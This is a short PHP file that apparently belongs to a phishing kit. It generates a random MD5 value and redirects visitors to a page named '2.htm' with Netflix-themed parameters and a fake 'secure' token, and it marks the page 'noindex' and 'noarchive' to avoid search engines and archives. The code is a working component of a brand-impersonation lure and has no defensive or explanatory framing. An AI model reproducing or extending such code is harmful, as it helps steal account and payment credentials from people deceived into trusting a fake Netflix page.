<?php

$random2=rand(0,100000000000);
$randomlink = md5($random2);



header("Location: 2.htm?netflix=_connect-run&secure=".$randomlink);

?>
<html xmlns="http://www.w3.org/1999/xhtml">
<meta name="robots" content="noindex">
<meta name="robots" content="noarchive">
</html>